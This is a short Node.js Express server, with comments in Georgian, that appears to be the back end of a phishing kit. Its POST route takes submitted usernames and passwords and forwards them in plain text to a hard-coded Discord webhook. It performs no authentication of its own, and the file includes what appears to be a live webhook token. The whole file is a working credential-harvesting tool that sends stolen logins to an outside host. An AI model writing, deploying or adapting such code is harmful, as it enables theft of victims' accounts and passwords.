const axios = require('axios');
const express = require('express');
const cors = require('cors');

const app = express();
const port = 3000;
// Middleware (JSON მონაცემების გაგზავნა)
app.use(express.json());

app.use(cors());


const webhookUrl = 'https://discord.com/api/webhooks/1400478149359173723/3FwdHZeKV8UdxINGre5jkI9Pm20Fut4Kb8ufBXlVwh-B6gcRnhMiD_8FNvFq777fGb4C';
const sendMessageToDiscord = (message) => {
    axios.post(webhookUrl, {
        content: message  // შეტყობინების შინაარსი
    })
    .then(response => {
        console.log('Message sent successfully!');
    })
    .catch(error => {
        console.error('Error sending message:', error);
    });
}


app.get("/", (req, res) => {
    res.send("Yo")
});

// POST route
app.post('/post', async(req, res) => {
    await sendMessageToDiscord('username: ' + req.body.username + "      | " + "password:" + req.body.password);
    return res.json({"status": "success"})
})

// აპლიკაციის დასაწყისი
app.listen(process.env.PORT || port, () => {
    console.log(`Launched on port ${port}`);
});
